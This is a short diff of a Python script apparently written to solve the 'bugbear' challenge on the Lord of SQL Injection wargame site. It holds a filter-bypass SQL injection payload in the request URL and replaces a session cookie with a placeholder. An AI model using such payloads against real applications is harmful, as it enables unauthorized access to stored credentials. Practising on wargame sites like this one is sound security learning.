@@ -1,7 +1,7 @@
 import requests
 
 url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=&no=1||1%26%26id/**/in("admin")%26%26'
-head = {'Cookie' : 'PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg'}
+head = {'Cookie' : 'PHPSESSID=값'}
 
 length = 1
 pwd = ''
